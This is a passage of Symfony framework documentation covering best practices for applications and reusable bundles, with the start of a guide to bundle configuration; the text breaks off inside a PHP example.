The Symfony Framework Best Practices
====================================

This article describes the **best practices for developing web applications with
Symfony** that fit the philosophy envisioned by the original Symfony creators.

If you don't agree with some of these recommendations, they might be a good
**starting point** that you can then **extend and fit to your specific needs**.
You can even ignore them completely and continue using your own best practices
and methodologies. Symfony is flexible enough to adapt to your needs.

This article assumes that you already have experience developing Symfony
applications. If you don't, read first the :doc:`Getting Started </setup>`
section of the documentation.

.. tip::

    Symfony provides a sample application called `Symfony Demo`_ that follows
    all these best practices, so you can experience them in practice.

Creating the Project
--------------------

Use the Symfony Binary to Create Symfony Applications
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The Symfony binary is an executable command created in your machine when you
`download Symfony`_. It provides multiple utilities, including the simplest way
to create new Symfony applications:

.. code-block:: terminal

    $ symfony new my_project_directory

Under the hood, this Symfony binary command executes the needed `Composer`_
command to :ref:`create a new Symfony application <creating-symfony-applications>`
based on the current stable version.

Use the Default Directory Structure
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Unless your project follows a development practice that imposes a certain
directory structure, follow the default Symfony directory structure. It's flat,
self-explanatory and not coupled to Symfony:

.. code-block:: text

    your_project/
    ├─ assets/
    ├─ bin/
    │  └─ console
    ├─ config/
    │  ├─ packages/
    │  └─ services.yaml
    ├─ migrations/
    ├─ public/
    │  ├─ build/
    │  └─ index.php
    ├─ src/
    │  ├─ Kernel.php
    │  ├─ Command/
    │  ├─ Controller/
    │  ├─ DataFixtures/
    │  ├─ Entity/
    │  ├─ EventSubscriber/
    │  ├─ Form/
    │  ├─ Repository/
    │  ├─ Security/
    │  └─ Twig/
    ├─ templates/
    ├─ tests/
    ├─ translations/
    ├─ var/
    │  ├─ cache/
    │  └─ log/
    └─ vendor/

Configuration
-------------

Use Environment Variables for Infrastructure Configuration
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The values of these options change from one machine to another (e.g. from your
development machine to the production server), but they don't modify the
application behavior.

:ref:`Use env vars in your project <config-env-vars>` to define these options
and create multiple ``.env`` files to :ref:`configure env vars per environment <config-dot-env>`.

.. _use-secret-for-sensitive-information:

Use Secrets for Sensitive Information
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

When your application has sensitive configuration, like an API key, you should
store those securely via :doc:`Symfony’s secrets management system </configuration/secrets>`.

Use Parameters for Application Configuration
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

These are the options used to modify the application behavior, such as the sender
of email notifications, or the enabled `feature toggles`_. Their value doesn't
change per machine, so don't define them as environment variables.

Define these options as :ref:`parameters <configuration-parameters>` in the
``config/services.yaml`` file. You can override these options per
:ref:`environment <configuration-environments>` in the ``config/services_dev.yaml``
and ``config/services_prod.yaml`` files.

Use Short and Prefixed Parameter Names
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Consider using ``app.`` as the prefix of your :ref:`parameters <configuration-parameters>`
to avoid collisions with Symfony and third-party bundles/libraries parameters.
Then, use just one or two words to describe the purpose of the parameter:

.. code-block:: yaml

    # config/services.yaml
    parameters:
        # don't do this: 'dir' is too generic, and it doesn't convey any meaning
        app.dir: '...'
        # do this: short but easy to understand names
        app.contents_dir: '...'
        # it's OK to use dots, underscores, dashes or nothing, but always
        # be consistent and use the same format for all the parameters
        app.dir.contents: '...'
        app.contents-dir: '...'

Use Constants to Define Options that Rarely Change
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Configuration options like the number of items to display in some listing rarely
change. Instead of defining them as :ref:`configuration parameters <configuration-parameters>`,
define them as PHP constants in the related classes. Example::

    // src/Entity/Post.php
    namespace App\Entity;

    class Post
    {
        public const NUMBER_OF_ITEMS = 10;

        // ...
    }

The main advantage of constants is that you can use them everywhere, including
Twig templates and Doctrine entities, whereas parameters are only available
from places with access to the :doc:`service container </service_container>`.

The only notable disadvantage of using constants for this kind of configuration
values is that it's complicated to redefine their values in your tests.

Business Logic
--------------

Don't Create any Bundle to Organize your Application Logic
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

When Symfony 2.0 was released, applications used :doc:`bundles </bundles>` to
divide their code into logical features: UserBundle, ProductBundle,
InvoiceBundle, etc. However, a bundle is meant to be something that can be
reused as a stand-alone piece of software.

If you need to reuse some feature in your projects, create a bundle for it (in a
private repository, do not make it publicly available). For the rest of your
application code, use PHP namespaces to organize code instead of bundles.

Use Autowiring to Automate the Configuration of Application Services
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

:doc:`Service autowiring </service_container/autowiring>` is a feature that
reads the type-hints on your constructor (or other methods) and automatically
passes the correct services to each method, making it unnecessary to configure
services explicitly and simplifying the application maintenance.

Use it in combination with :ref:`service autoconfiguration <services-autoconfigure>`
to also add :doc:`service tags </service_container/tags>` to the services
needing them, such as Twig extensions, event subscribers, etc.

Services Should be Private Whenever Possible
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

:ref:`Make services private <container-public>` to prevent you from accessing
those services via ``$container->get()``. Instead, you will need to use proper
dependency injection.

Use the YAML Format to Configure your own Services
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

If you use the :ref:`default services.yaml configuration <service-container-services-load-example>`,
most services will be configured automatically. However, in some edge cases
you'll need to configure services (or parts of them) manually.

YAML is the format recommended configuring services because it's friendly to
newcomers and concise, but Symfony also supports XML and PHP configuration.

Use Attributes to Define the Doctrine Entity Mapping
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Doctrine entities are plain PHP objects that you store in some "database".
Doctrine only knows about your entities through the mapping metadata configured
for your model classes.

Doctrine supports several metadata formats, but it's recommended to use PHP
attributes because they are by far the most convenient and agile way of setting
up and looking for mapping information.

Controllers
-----------

Make your Controller Extend the ``AbstractController`` Base Controller
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Symfony provides a :ref:`base controller <the-base-controller-classes-services>`
which includes shortcuts for the most common needs such as rendering templates
or checking security permissions.

Extending your controllers from this base controller couples your application
to Symfony. Coupling is generally wrong, but it may be OK in this case because
controllers shouldn't contain any business logic. Controllers should contain
nothing more than a few lines of *glue-code*, so you are not coupling the
important parts of your application.

.. _best-practice-controller-annotations:
.. _best-practice-controller-attributes:

Use Attributes to Configure Routing, Caching, and Security
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Using attributes for routing, caching, and security simplifies
configuration. You don't need to browse several files created with different
formats (YAML, XML, PHP): all the configuration is just where you  require it,
and it only uses one format.

Use Dependency Injection to Get Services
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

If you extend the base ``AbstractController``, you can only get access to the most
common services (e.g ``twig``, ``router``, ``doctrine``, etc.), directly from the
container via ``$this->container->get()``.
Instead, you must use dependency injection to fetch services by
:ref:`type-hinting action method arguments <controller-accessing-services>` or
constructor arguments.

Use Entity Value Resolvers If They Are Convenient
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

If you're using :doc:`Doctrine </doctrine>`, then you can *optionally* use
the :ref:`EntityValueResolver <doctrine-entity-value-resolver>` to
automatically query for an entity and pass it as an argument to your
controller. It will also show a 404 page if no entity can be found.

If the logic to get an entity from a route variable is more complex, instead of
configuring the EntityValueResolver, it's better to make the Doctrine query
inside the controller (e.g. by calling to a :doc:`Doctrine repository method </doctrine>`).

Templates
---------

Use Snake Case for Template Names and Variables
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Use lowercase snake_case for template names, directories, and variables (e.g.
``user_profile`` instead of ``userProfile`` and ``product/edit_form.html.twig``
instead of ``Product/EditForm.html.twig``).

Prefix Template Fragments with an Underscore
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Template fragments, also called *"partial templates"*, allow to
:ref:`reuse template contents <templates-reuse-contents>`. Prefix their names
with an underscore to better differentiate them from complete templates (e.g.
``_user_metadata.html.twig`` or ``_caution_message.html.twig``).

Forms
-----

Define your Forms as PHP Classes
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Creating :ref:`forms in classes <creating-forms-in-classes>` allows reusing
them in different parts of the application. Besides, not creating forms in
controllers simplifies the code and maintenance of the controllers.

Add Form Buttons in Templates
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Form classes should be agnostic to where they will be used. For example, the
button of a form used to both create and edit items should change from "Add new"
to "Save changes" depending on where it's used.

Instead of adding buttons in form classes or the controllers, it's recommended
to add buttons in the templates. This also improves the separation of concerns
because the button styling (CSS class and other attributes) is defined in the
template instead of in a PHP class.

However, if you create a :doc:`form with multiple submit buttons </form/multiple_buttons>`
you should define them in the controller instead of the template. Otherwise, you
won't be able to check which button was clicked when handling the form in the controller.

Define Validation Constraints on the Underlying Object
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Attaching :doc:`validation constraints </reference/constraints>` to form fields
instead of to the mapped object prevents the validation from being reused in
other forms or other places where the object is used.

.. _best-practice-handle-form:

Use a Single Action to Render and Process the Form
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

:ref:`Rendering forms <rendering-forms>` and :ref:`processing forms <processing-forms>`
are two of the main tasks when handling forms. Both are too similar (most of the
time, almost identical), so it's much simpler to let a single controller action
handle both.

.. _best-practice-internationalization:

Internationalization
--------------------

Use the XLIFF Format for Your Translation Files
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Of all the translation formats supported by Symfony (PHP, Qt, ``.po``, ``.mo``,
JSON, CSV, INI, etc.), ``XLIFF`` and ``gettext`` have the best support in the tools used
by professional translators. And since it's based on XML, you can validate ``XLIFF``
file contents as you write them.

Symfony also supports notes in XLIFF files, making them more user-friendly for
translators. At the end, good translations are all about context, and these
XLIFF notes allow you to define that context.

Use Keys for Translations Instead of Content Strings
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Using keys simplifies the management of the translation files because you can
change the original contents in templates, controllers, and services without
having to update all the translation files.

Keys should always describe their *purpose* and *not* their location. For
example, if a form has a field with the label "Username", then a nice key
would be ``label.username``, *not* ``edit_form.label.username``.

Security
--------

Define a Single Firewall
~~~~~~~~~~~~~~~~~~~~~~~~

Unless you have two legitimately different authentication systems and users
(e.g. form login for the main site and a token system for your API only), it's
recommended to have only one firewall to keep things simple.

Additionally, you should use the ``anonymous`` key under your firewall. If you
require users to be logged in for different sections of your site, use the
:doc:`access_control </security/access_control>` option.

Use the ``auto`` Password Hasher
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The :ref:`auto password hasher <reference-security-encoder-auto>` automatically
selects the best possible encoder/hasher depending on your PHP installation.
Currently, the default auto hasher is ``bcrypt``.

Use Voters to Implement Fine-grained Security Restrictions
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

If your security logic is complex, you should create custom
:doc:`security voters </security/voters>` instead of defining long expressions
inside the ``#[Security]`` attribute.

Web Assets
----------

.. _use-webpack-encore-to-process-web-assets:

Use AssetMapper to Manage Web Assets
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Web assets are the CSS, JavaScript, and image files that make the frontend of
your site look and work great. :doc:`AssetMapper </frontend/asset_mapper>` lets
you write modern JavaScript and CSS without the complexity of using a bundler
such as `Webpack`_ (directly or via :doc:`Webpack Encore </frontend/encore/index>`).

Tests
-----

Smoke Test your URLs
~~~~~~~~~~~~~~~~~~~~

In software engineering, `smoke testing`_ consists of *"preliminary testing to
reveal simple failures severe enough to reject a prospective software release"*.
Using `PHPUnit data providers`_ you can define a functional test that
checks that all application URLs load successfully::

    // tests/ApplicationAvailabilityFunctionalTest.php
    namespace App\Tests;

    use Symfony\Bundle\FrameworkBundle\Test\WebTestCase;

    class ApplicationAvailabilityFunctionalTest extends WebTestCase
    {
        /**
         * @dataProvider urlProvider
         */
        public function testPageIsSuccessful($url): void
        {
            $client = self::createClient();
            $client->request('GET', $url);

            $this->assertResponseIsSuccessful();
        }

        public function urlProvider(): \Generator
        {
            yield ['/'];
            yield ['/posts'];
            yield ['/post/fixture-post-1'];
            yield ['/blog/category/fixture-category'];
            yield ['/archives'];
            // ...
        }
    }

Add this test while creating your application because it requires little effort
and checks that none of your pages returns an error. Later, you'll add more
specific tests for each page.

.. _hardcode-urls-in-a-functional-test:

Hard-code URLs in a Functional Test
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

In Symfony applications, it's recommended to :ref:`generate URLs <routing-generating-urls>`
using routes to automatically update all links when a URL changes. However, if a
public URL changes, users won't be able to browse it unless you set up a
redirection to the new URL.

That's why it's recommended to use raw URLs in tests instead of generating them
from routes. Whenever a route changes, tests will fail, and you'll know that
you must set up a redirection.

.. _`Symfony Demo`: https://github.com/symfony/demo
.. _`download Symfony`: https://symfony.com/download
.. _`Composer`: https://getcomposer.org/
.. _`feature toggles`: https://en.wikipedia.org/wiki/Feature_toggle
.. _`smoke testing`: https://en.wikipedia.org/wiki/Smoke_testing_(software)
.. _`Webpack`: https://webpack.js.org/
.. _`PHPUnit data providers`: https://docs.phpunit.de/en/9.6/writing-tests-for-phpunit.html#data-providers
Best Practices for Reusable Bundles
===================================

This article is all about how to structure your **reusable bundles** to be
configurable and extendable. Reusable bundles are those meant to be shared
privately across many company projects or publicly so any Symfony project can
install them.

.. _bundles-naming-conventions:

Bundle Name
-----------

A bundle is also a PHP namespace. The namespace must follow the `PSR-4`_
interoperability standard for PHP namespaces and class names: it starts with a
vendor segment, followed by zero or more category segments, and it ends with the
namespace short name, which must end with ``Bundle``.

A namespace becomes a bundle as soon as you add "a bundle class" to it (which is
a class that extends :class:`Symfony\\Component\\HttpKernel\\Bundle\\Bundle`).
The bundle class name must follow these rules:

* Use only alphanumeric characters and underscores;
* Use a StudlyCaps name (i.e. camelCase with an uppercase first letter);
* Use a descriptive and short name (no more than two words);
* Prefix the name with the concatenation of the vendor (and optionally the
  category namespaces);
* Suffix the name with ``Bundle``.

Here are some valid bundle namespaces and class names:

==========================  ==================
Namespace                   Bundle Class Name
==========================  ==================
``Acme\Bundle\BlogBundle``  AcmeBlogBundle
``Acme\BlogBundle``         AcmeBlogBundle
==========================  ==================

By convention, the ``getName()`` method of the bundle class should return the
class name.

.. note::

    If you share your bundle publicly, you must use the bundle class name as
    the name of the repository (AcmeBlogBundle and not BlogBundle for instance).

.. note::

    Symfony core Bundles do not prefix the Bundle class with ``Symfony``
    and always add a ``Bundle`` sub-namespace; for example:
    :class:`Symfony\\Bundle\\FrameworkBundle\\FrameworkBundle`.

Each bundle has an alias, which is the lower-cased short version of the bundle
name using underscores (``acme_blog`` for AcmeBlogBundle). This alias
is used to enforce uniqueness within a project and for defining bundle's
configuration options (see below for some usage examples).

Directory Structure
-------------------

The following is the recommended directory structure of an AcmeBlogBundle:

.. code-block:: text

    <your-bundle>/
    ├── assets/
    ├── config/
    ├── docs/
    │   └─ index.md
    ├── public/
    ├── src/
    │   ├── Controller/
    │   ├── DependencyInjection/
    │   └── AcmeBlogBundle.php
    ├── templates/
    ├── tests/
    ├── translations/
    ├── LICENSE
    └── README.md

This directory structure requires to configure the bundle path to its root
directory as follows::

    class AcmeBlogBundle extends Bundle
    {
        public function getPath(): string
        {
            return \dirname(__DIR__);
        }
    }

**The following files are mandatory**, because they ensure a structure convention
that automated tools can rely on:

* ``src/AcmeBlogBundle.php``: This is the class that transforms a plain directory
  into a Symfony bundle (change this to your bundle's name);
* ``README.md``: This file contains the basic description of the bundle and it
  usually shows some basic examples and links to its full documentation (it
  can use any of the markup formats supported by GitHub, such as ``README.rst``);
* ``LICENSE``: The full contents of the license used by the code. Most third-party
  bundles are published under the MIT license, but you can `choose any license`_;
* ``docs/index.md``: The root file for the Bundle documentation.

The depth of subdirectories should be kept to a minimum for the most used
classes and files. Two levels is the maximum.

The bundle directory is read-only. If you need to write temporary files, store
them under the ``cache/`` or ``log/`` directory of the host application. Tools
can generate files in the bundle directory structure, but only if the generated
files are going to be part of the repository.

The following classes and files have specific emplacements (some are mandatory
and others are just conventions followed by most developers):

===================================================  ========================================
Type                                                 Directory
===================================================  ========================================
Commands                                             ``src/Command/``
Controllers                                          ``src/Controller/``
Service Container Extensions                         ``src/DependencyInjection/``
Doctrine ORM entities                                ``src/Entity/``
Doctrine ODM documents                               ``src/Document/``
Event Listeners                                      ``src/EventListener/``
Configuration (routes, services, etc.)               ``config/``
Web Assets (compiled CSS and JS, images)             ``public/``
Web Asset sources (``.scss``, ``.ts``, Stimulus)     ``assets/``
Translation files                                    ``translations/``
Validation (when not using attributes)               ``config/validation/``
Serialization (when not using attributes)            ``config/serialization/``
Templates                                            ``templates/``
Unit and Functional Tests                            ``tests/``
===================================================  ========================================

Classes
-------

The bundle directory structure is used as the namespace hierarchy. For
instance, a ``ContentController`` controller which is stored in
``src/Controller/ContentController.php`` would have the fully
qualified class name of ``Acme\BlogBundle\Controller\ContentController``.

All classes and files must follow the :doc:`Symfony coding standards </contributing/code/standards>`.

Some classes should be seen as facades and should be as short as possible, like
Commands, Helpers, Listeners and Controllers.

Classes that connect to the event dispatcher should be suffixed with
``Listener``.

Exception classes should be stored in an ``Exception`` sub-namespace.

Vendors
-------

A bundle must not embed third-party PHP libraries. It should rely on the
standard Symfony autoloading instead.

A bundle should also not embed third-party libraries written in JavaScript,
CSS or any other language.

Doctrine Entities/Documents
---------------------------

If the bundle includes Doctrine ORM entities and/or ODM documents, it's
recommended to define their mapping using XML files stored in
``config/doctrine/``. This allows to override that mapping using the
:doc:`standard Symfony mechanism to override bundle parts </bundles/override>`.
This is not possible when using attributes to define the mapping.

Tests
-----

A bundle should come with a test suite written with PHPUnit and stored under
the ``tests/`` directory. Tests should follow the following principles:

* The test suite must be executable with a simple ``phpunit`` command run from
  a sample application;
* The functional tests should only be used to test the response output and
  some profiling information if you have some;
* The tests should cover at least 95% of the code base.

.. note::

    A test suite must not contain ``AllTests.php`` scripts, but must rely on the
    existence of a ``phpunit.xml.dist`` file.

Continuous Integration
----------------------

Testing bundle code continuously, including all its commits and pull requests,
is a good practice called Continuous Integration. There are several services
providing this feature for free for open source projects, like `GitHub Actions`_
and `Travis CI`_.

A bundle should at least test:

* The lower bound of their dependencies (by running ``composer update --prefer-lowest``);
* The supported PHP versions;
* All supported major Symfony versions (e.g. both ``4.x`` and ``5.x`` if
  support is claimed for both).

Thus, a bundle supporting PHP 7.3, 7.4 and 8.0, and Symfony 4.4 and 5.x should
have at least this test matrix:

===========  ===============  ===================
PHP version  Symfony version  Composer flags
===========  ===============  ===================
7.3          ``4.*``          ``--prefer-lowest``
7.4          ``5.*``
8.0          ``5.*``
===========  ===============  ===================

.. tip::

    The tests should be run with the ``SYMFONY_DEPRECATIONS_HELPER``
    env variable set to ``max[direct]=0``. This ensures no code in the
    bundle uses deprecated features directly.

    The lowest dependency tests can be run with this variable set to
    ``disabled=1``.

Require a Specific Symfony Version
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

You can use the special ``SYMFONY_REQUIRE`` environment variable together
with Symfony Flex to install a specific Symfony version:

.. code-block:: bash

    # this requires Symfony 5.x for all Symfony packages
    export SYMFONY_REQUIRE=5.*
    # alternatively you can run this command to update composer.json config
    # composer config extra.symfony.require "5.*"

    # install Symfony Flex in the CI environment
    composer global config --no-plugins allow-plugins.symfony/flex true
    composer global require --no-progress --no-scripts --no-plugins symfony/flex

    # install the dependencies (using --prefer-dist and --no-progress is
    # recommended to have a better output and faster download time)
    composer update --prefer-dist --no-progress

.. caution::

    If you want to cache your Composer dependencies, **do not** cache the
    ``vendor/`` directory as this has side-effects. Instead cache
    ``$HOME/.composer/cache/files``.

Installation
------------

Bundles should set ``"type": "symfony-bundle"`` in their ``composer.json`` file.
With this, :ref:`Symfony Flex <symfony-flex>` will be able to automatically
enable your bundle when it's installed.

If your bundle requires any setup (e.g. configuration, new files, changes to
``.gitignore``, etc), then you should create a `Symfony Flex recipe`_.

Documentation
-------------

All classes and functions must come with full PHPDoc.

Extensive documentation should also be provided in the ``docs/``
directory.
The index file (for example ``docs/index.rst`` or
``docs/index.md``) is the only mandatory file and must be the entry
point for the documentation. The
:doc:`reStructuredText (rST) </contributing/documentation/format>` is the format
used to render the documentation on the Symfony website.

Installation Instructions
~~~~~~~~~~~~~~~~~~~~~~~~~

In order to ease the installation of third-party bundles, consider using the
following standardized instructions in your ``README.md`` file.

.. configuration-block::

    .. code-block:: markdown

        Installation
        ============

        Make sure Composer is installed globally, as explained in the
        [installation chapter](https://getcomposer.org/doc/00-intro.md)
        of the Composer documentation.

        Applications that use Symfony Flex
        ----------------------------------

        Open a command console, enter your project directory and execute:

        ```console
        composer require <package-name>
        ```

        Applications that don't use Symfony Flex
        ----------------------------------------

        ### Step 1: Download the Bundle

        Open a command console, enter your project directory and execute the
        following command to download the latest stable version of this bundle:

        ```console
        composer require <package-name>
        ```

        ### Step 2: Enable the Bundle

        Then, enable the bundle by adding it to the list of registered bundles
        in the `config/bundles.php` file of your project:

        ```php
        // config/bundles.php

        return [
            // ...
            <vendor>\<bundle-name>\<bundle-long-name>::class => ['all' => true],
        ];
        ```

    .. code-block:: rst

        Installation
        ============

        Make sure Composer is installed globally, as explained in the
        `installation chapter`_ of the Composer documentation.

        ----------------------------------

        Open a command console, enter your project directory and execute:

        .. code-block:: terminal

            composer require <package-name>

        Applications that don't use Symfony Flex
        ----------------------------------------

        Step 1: Download the Bundle
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~

        Open a command console, enter your project directory and execute the
        following command to download the latest stable version of this bundle:

        .. code-block:: terminal

            composer require <package-name>

        Step 2: Enable the Bundle
        ~~~~~~~~~~~~~~~~~~~~~~~~~

        Then, enable the bundle by adding it to the list of registered bundles
        in the ``config/bundles.php`` file of your project::

            // config/bundles.php
            return [
                // ...
                <vendor>\<bundle-name>\<bundle-long-name>::class => ['all' => true],
            ];

        .. _`installation chapter`: https://getcomposer.org/doc/00-intro.md

The example above assumes that you are installing the latest stable version of
the bundle, where you don't have to provide the package version number
(e.g. ``composer require friendsofsymfony/user-bundle``). If the installation
instructions refer to some past bundle version or to some unstable version,
include the version constraint (e.g. ``composer require friendsofsymfony/user-bundle "~2.0@dev"``).

Optionally, you can add more installation steps (*Step 3*, *Step 4*, etc.) to
explain other required installation tasks, such as registering routes or
dumping assets.

Routing
-------

If the bundle provides routes, they must be prefixed with the bundle alias.
For example, if your bundle is called AcmeBlogBundle, all its routes must be
prefixed with ``acme_blog_``.

Templates
---------

If a bundle provides templates, they must use Twig. A bundle must not provide
a main layout, except if it provides a full working application.

Translation Files
-----------------

If a bundle provides message translations, they must be defined in the XLIFF
format; the domain should be named after the bundle name (``acme_blog``).

A bundle must not override existing messages from another bundle.

Configuration
-------------

To provide more flexibility, a bundle can provide configurable settings by
using the Symfony built-in mechanisms.

For simple configuration settings, rely on the default ``parameters`` entry of
the Symfony configuration. Symfony parameters are simple key/value pairs; a
value being any valid PHP value. Each parameter name should start with the
bundle alias, though this is just a best-practice suggestion. The rest of the
parameter name will use a period (``.``) to separate different parts (e.g.
``acme_blog.author.email``).

The end user can provide values in any configuration file:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        parameters:
            acme_blog.author.email: 'fabien@example.com'

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd"
        >
            <parameters>
                <parameter key="acme_blog.author.email">fabien@example.com</parameter>
            </parameters>

        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        return static function (ContainerConfigurator $container): void {
            $container->parameters()
                ->set('acme_blog.author.email', 'fabien@example.com')
            ;
        };

Retrieve the configuration parameters in your code from the container::

    $container->getParameter('acme_blog.author.email');

While this mechanism requires the least effort, you should consider using the
more advanced :doc:`semantic bundle configuration </bundles/configuration>` to
make your configuration more robust.

Versioning
----------

Bundles must be versioned following the `Semantic Versioning Standard`_.

Services
--------

If the bundle defines services, they must be prefixed with the bundle alias
instead of using fully qualified class names like you do in your project
services. For example, AcmeBlogBundle services must be prefixed with ``acme_blog``.
The reason is that bundles shouldn't rely on features such as service autowiring
or autoconfiguration to not impose an overhead when compiling application services.

In addition, services not meant to be used by the application directly, should
be :ref:`defined as private <container-private-services>`. For public services,
:ref:`aliases should be created <service-autowiring-alias>` from the interface/class
to the service id. For example, in MonologBundle, an alias is created from
``Psr\Log\LoggerInterface`` to ``logger`` so that the ``LoggerInterface`` type-hint
can be used for autowiring.

Services should not use autowiring or autoconfiguration. Instead, all services should
be defined explicitly.

.. tip::

    If there is no intention for the service id to be used by the end user, you can
    mark it as *hidden* by prefixing it with a dot (e.g. ``.acme_blog.logger``).
    This prevents the service from being listed in the default ``debug:container``
    command output.

.. seealso::

    You can learn much more about service loading in bundles reading this article:
    :doc:`How to Load Service Configuration inside a Bundle </bundles/extension>`.

Composer Metadata
-----------------

The ``composer.json`` file should include at least the following metadata:

``name``
    Consists of the vendor and the short bundle name. If you are releasing the
    bundle on your own instead of on behalf of a company, use your personal name
    (e.g. ``johnsmith/blog-bundle``). Exclude the vendor name from the bundle
    short name and separate each word with a hyphen. For example: AcmeBlogBundle
    is transformed into ``blog-bundle`` and AcmeSocialConnectBundle is
    transformed into ``social-connect-bundle``.

``description``
    A brief explanation of the purpose of the bundle.

``type``
    Use the ``symfony-bundle`` value.

``license``
    a string (or array of strings) with a `valid license identifier`_, such as ``MIT``.

``autoload``
    This information is used by Symfony to load the classes of the bundle. It's
    recommended to use the `PSR-4`_ autoload standard: use the namespace as key,
    and the location of the bundle's main class (relative to ``composer.json``)
    as value. As the main class is located in the ``src/`` directory of the bundle:

    .. code-block:: json

        {
            "autoload": {
                "psr-4": {
                    "Acme\\BlogBundle\\": "src/"
                }
            },
            "autoload-dev": {
                "psr-4": {
                    "Acme\\BlogBundle\\Tests\\": "tests/"
                }
            }
        }

In order to make it easier for developers to find your bundle, register it on
`Packagist`_, the official repository for Composer packages.

Resources
---------

If the bundle references any resources (config files, translation files, etc.),
you can use physical paths (e.g. ``__DIR__/config/services.xml``).

In the past, we recommended to only use logical paths (e.g.
``@AcmeBlogBundle/config/services.xml``) and resolve them with the
:ref:`resource locator <http-kernel-resource-locator>` provided by the Symfony
kernel, but this is no longer a recommended practice.

Learn more
----------

* :doc:`/bundles/extension`
* :doc:`/bundles/configuration`

.. _`PSR-4`: https://www.php-fig.org/psr/psr-4/
.. _`Symfony Flex recipe`: https://github.com/symfony/recipes
.. _`Semantic Versioning Standard`: https://semver.org/
.. _`Packagist`: https://packagist.org/
.. _`choose any license`: https://choosealicense.com/
.. _`valid license identifier`: https://spdx.org/licenses/
.. _`GitHub Actions`: https://docs.github.com/en/free-pro-team@latest/actions
.. _`Travis CI`: https://docs.travis-ci.com/
How to Create Friendly Configuration for a Bundle
=================================================

If you open your main application configuration directory (usually
``config/packages/``), you'll see a number of different files, such as
``framework.yaml``, ``twig.yaml`` and ``doctrine.yaml``. Each of these
configures a specific bundle, allowing you to define options at a high level and
then let the bundle make all the low-level, complex changes based on your
settings.

For example, the following configuration tells the FrameworkBundle to enable the
form integration, which involves the definition of quite a few services as well
as integration of other related components:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/framework.yaml
        framework:
            form: true

    .. code-block:: xml

        <!-- config/packages/framework.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony
                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd"
        >
            <framework:config>
                <framework:form/>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/framework.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $framework->form()->enabled(true);
        };

Using the Bundle Extension
--------------------------

Imagine you are creating a new bundle - AcmeSocialBundle - which provides
integration with Twitter. To make your bundle configurable to the user, you
can add some configuration that looks like this:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/acme_social.yaml
        acme_social:
            twitter:
                client_id: 123
                client_secret: your_secret

    .. code-block:: xml

        <!-- config/packages/acme_social.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:acme-social="http://example.org/schema/dic/acme_social"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd"
        >
            <acme-social:config>
                <acme-social:twitter client-id="123"
                    client-secret="your_secret"
                />
            </acme-social:config>
        </container>

    .. code-block:: php

        // config/packages/acme_social.php
